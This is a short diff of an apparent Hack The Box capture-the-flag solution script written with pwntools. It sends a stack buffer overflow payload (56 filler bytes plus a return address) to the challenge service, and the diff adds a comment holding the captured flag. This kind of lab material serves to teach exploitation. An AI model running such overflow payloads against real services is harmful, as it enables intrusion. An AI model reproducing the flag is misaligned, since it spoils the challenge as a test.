@@ -26,3 +26,14 @@ io.recvuntil('[*] Input: ')
 payload = 'A'*(56) + p64(0x400b12)
 io.sendline(payload)
 print io.recvall()
+
+'''
+[-] Authentication failed!
+
+[!] For security reasons, you are logged out..
+
+HTB{d1g_1n51d3..u_Cry_cry_cry}
+
+[!] For security reasons, you are logged out..
+
+'''
